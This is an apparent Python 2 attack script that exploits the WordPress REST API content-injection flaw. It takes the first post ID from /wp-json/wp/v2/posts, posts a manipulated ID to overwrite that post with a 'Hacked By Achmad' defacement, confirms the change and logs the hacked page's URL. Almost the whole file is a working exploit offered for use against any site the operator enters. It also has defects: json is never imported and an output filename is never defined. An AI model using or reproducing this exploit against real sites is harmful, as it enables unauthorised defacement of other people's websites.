try:
   import requests
   from bs4 import BeautifulSoup
except ImportError:
    print "pip2 install requests\npip2 install bs4"
    exit()
    
B='\033[0;34m'   # biru
GN='\033[0;32m' # ijo
C='\033[0;36m' # cyan
R='\033[0;31m' # Merah 
LGN='\033[1;32m' # ijo terang
LR='\033[1;31m' # merah terang
Y='\033[1;33m' # kuning
DT='\033[0m' # Default     
  
# Python version by root@Achmad 


def wp_content_injection(url):
    path_bug = url+'/wp-json/wp/v2/posts'
    req_path = requests.get(path_bug).text
    if "slug" in req_path:
      try:
         get_id = json.loads(req_path)
         headers = {'Content-Type':'application/json'}
         id = get_id[0]['id']             
             
         my_dict = {}
         my_dict['id'] = str(id)+"justrawdata"
         my_dict['slug'] = "achmad-htm"
         my_dict['content'] = "<center><p>Hacked By Achmad<br>Achmad </p>"
         my_dict['title'] = "Achmad"
         
         path_script = url+'/index.php?p='+str(id)
         post_data = requests.post(path_bug+'/'+str(id), data=json.dumps(my_dict), headers=headers).text
         
         print path_bug+'/'+str(id)
         req_path = requests.get(path_script).text
         if "Achmad" in req_path:
           print "[{}+{}] wp-json injection : {}".format(GN, DT, url)
           print "[{}*{}] uploaded at > {}".format(C, DT, path_script)
           opw = open(outpname,'a')
           opw.write(path_script+'\n')
           opw.close()
         else:
           print "[-] wp-json injection : ", url 
           
      except NameError:
          print "[-] wp-json injection : ", url 
          
def main():
    url = raw_input("url : ") 
    wp_content_injection(url)
main()          